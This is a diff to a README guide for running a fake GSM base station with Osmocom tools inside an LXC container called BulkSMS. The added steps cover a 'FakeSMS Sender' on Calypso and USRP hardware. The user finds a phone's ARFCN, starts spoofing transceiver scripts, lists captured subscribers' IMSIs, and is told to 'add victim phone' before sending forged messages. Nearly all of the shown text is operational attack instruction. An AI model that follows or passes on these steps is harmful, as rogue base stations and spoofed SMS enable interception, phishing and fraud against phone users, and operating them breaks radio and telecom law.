@@ -819,20 +819,21 @@ You could find imsi and extension
 lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py
 ```
 ## Testing CALYPSO FakeSMS Sender
+
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
 Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
 Installing network signal guru on your android phone  
 And finding the arfcn that this one is connect  
 Let's name this arfcn as 975  
 Configure arfcn at service/osmotrx.lms as 975
 ```
-lxc exec BulkSMS -- nano osmo-nitb-scripts-calypsobts/services/osmo-trx-lms3.service 
+nano services/osmo-trx-lms3.service 
 ```
-Save the configuration using ctrl+x
-```
-lxc exec BulkSMS -- osmo-nitb-scripts-calypsobts/install_services.sh 
-```
-
-
 ```
 lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/trx.sh
 ```
@@ -840,10 +841,10 @@ Tape ctrl+shift+T
 ```
 lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/main.py
 ```
+Add victim phone and tape Tape ctrl+shift+T
 ```
 lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/interact.py
 ```
-
 
 
 ## Testing TRX UHD (USRP)
@@ -905,8 +906,9 @@ lxc exec BulkSMS -- bash
 ```
 osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
 ```
+Tape ctrl+shift+T
 ```
-lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd.py
+lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd_spoof.py
 ```
 ```
 exit
@@ -967,6 +969,32 @@ lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 16
 You could find imsi and extension
 ```
 lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
+```
+```
+exit
+```
+
+## Testing USRP Fake SMS Sender
+
+```
+cd osmo-nitb-scripts
+```
+```
+bash install_services.sh 
+```
+```
+lxc exec BulkSMS -- bash 
+```
+```
+osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
+```
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd.py
+```
+Add victim phone and tape Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/interact.py
 ```
 ```
 exit
